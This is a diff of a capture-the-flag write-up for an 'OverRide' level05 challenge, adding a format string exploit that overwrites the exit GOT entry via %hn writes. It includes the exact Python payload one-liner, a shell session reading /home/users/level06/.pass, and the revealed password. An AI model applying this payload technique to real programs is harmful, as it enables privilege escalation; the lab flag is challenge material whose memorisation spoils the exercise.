@@ -113,9 +113,17 @@ Our attack takes place in 2 steps:
       - ```%11$hn``` for 11th argument, half word/short int [2 bytes]
 ```
 "exit GOT address [2 first bytes] + exit GOT address [2 last bytes] + shellcode addr [2 bytes] + '%10$hn' + shellcode addr [2 bytes] + '%11$hn'"
+
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10189d%11$hn")'; cat) | ./level05
 ```
 
 Let's try it. 
 ```
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10189d%11$hn")'; cat) | ./level05
+level05@OverRide:~$ (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10189d%11$hn")'; cat) | ./level05
+
+[...]
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
